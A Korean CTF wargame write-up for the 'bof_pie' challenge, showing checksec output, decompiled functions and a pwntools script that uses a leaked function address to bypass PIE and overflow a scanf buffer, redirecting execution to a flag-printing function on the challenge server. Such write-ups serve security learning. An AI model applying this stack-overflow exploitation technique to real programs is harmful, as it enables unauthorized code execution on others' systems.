# BOF_PIE

```c
kimdong@ubuntu  ~/Wargame  file bof_pie
bof_pie: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=51bf2a67853257d1a3c8a539861e79160befe163, not stripped

kimdong@ubuntu  ~/Wargame  checksec bof_pie
[*] '/home/kimdong/Wargame/bof_pie'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      PIE enabled
 ```
 이번 바이너리 파일은 32-bit에 NX와 PIE 보호기법이 설정되어있다.<br>

 ```c
 kimdong@ubuntu  ~/Wargame  ./bof_pie
Hello, Do you know j0n9hyun?
j0n9hyun is 0x565b6909
0x565b90^H
Nah...

kimdong@ubuntu  ~/Wargame  ./bof_pie
Hello, Do you know j0n9hyun?
j0n9hyun is 0x565e6909
0x565e6909
Nah...
```
실행을 해보면 다음과 같이 출력문이 2가지 나오고, 사용자 입력값을 받은후에 Nah라는 문자열을 다시 출력해준다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  welcome();
  puts("Nah...");
  return 0;
}
```
main문은 welcome이라는 함수외에 문자열을 출력해주는 함수만 있다.<br>
welcome이라는 함수를 보도록 하자.<br>

```c
int welcome()
{
  char v1; // [esp+6h] [ebp-12h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Hello, Do you know j0n9hyun?");
  printf("j0n9hyun is %p\n", welcome);
  return _isoc99_scanf("%s", &v1);
}
```
welcome이라는 함수는 문자열을 출력해주고, welcome의 주소지를 출력해준다.<br>
scanf로 문자열을 받으므로 길이값을 검증하지 않는다.<br>

```c
void j0n9hyun()
{
  char s; // [esp+4h] [ebp-34h]
  FILE *stream; // [esp+2Ch] [ebp-Ch]

  puts("ha-wi");
  stream = fopen("flag", "r");
  if ( stream )
  {
    fgets(&s, 40, stream);
    fclose(stream);
    puts(&s);
  }
  else
  {
    perror("flag");
  }
}
```
ida에서 확인을 하다보니, j0n9hyun이라는 함수가 있다.<br>
이 함수를 보면 flag를 출력시켜주는 것으로 보인다.<br>
일단 j0n9hyun이라는 함수의 주소는 `0x56555890`에 위치한다.<br>
바이너리를 실행했을때는 `0x56555909`에 위치한다고 알려준다.<br>
이 값을 받아서 welcome함수의 ret의 주소를 j0n9hyun으로 변경시켜주면 될것같다.<br>
아, 그런데 PIE 기법으로 인해 두 함수의 주소가 매번 바뀌는데 둘의 offset차이는 0x79로 기존 바이너리가 출력시켜주는 값에서 0x79값을 빼주면 j0n9hyun으로 바뀔것같다.<br>


---

## Exploit Code

```c
from pwn import *
p =  remote("ctf.j0n9hyun.xyz",3008)
p.recvuntil("j0n9hyun is ")
addr = int(p.recv(10),16)
print addr
offset = 0x79
real_addr= addr - offset
print real_addr
payload = "A"*(0x12+0x4)
payload += p32(real_addr)

p.sendline(payload)
p.interactive()
```
```c
kimdong@ubuntu  ~/Wargame  python ex_bof_pie.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3008: Done
1448552713
1448552592
[*] Switching to interactive mode

ha-wi
HackCTF{}
[*] Got EOF while reading in interactive
```
